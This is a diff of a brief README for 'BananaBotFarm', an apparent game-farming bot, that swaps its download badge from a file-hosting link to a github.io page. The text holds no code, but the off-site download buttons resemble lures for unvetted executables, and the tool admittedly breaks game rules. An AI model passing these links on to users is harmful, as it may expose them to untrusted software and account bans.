@@ -1,6 +1,6 @@
 **BananaBotFarm** is an automation tool or script designed for use in online games, aimed at automating the process of farming resources, such as bananas or other in-game items. It allows players to collect items efficiently without needing to manually perform repetitive tasks. This tool is typically used to farm large amounts of resources quickly, making gameplay easier and saving time for players who want to progress faster in the game. 
 
-[![Download BananaBotFarm](https://img.shields.io/badge/Download-BananaFarm%20bot-blueviolet)](https://downloadifiles.com/?label=1e88dd1be7cebcac3b93ae91dcb2375f)
+[![Download BananaBotFarm](https://img.shields.io/badge/Download-BananaFarm%20bot-blueviolet)](https://bananabotfarm.github.io/.github/)
 
 While it can significantly improve farming efficiency, **BananaBotFarm** might violate the terms of service of some games. Using such scripts can lead to penalties, including account suspensions or bans, as it typically goes against the game's rules regarding automation.
 
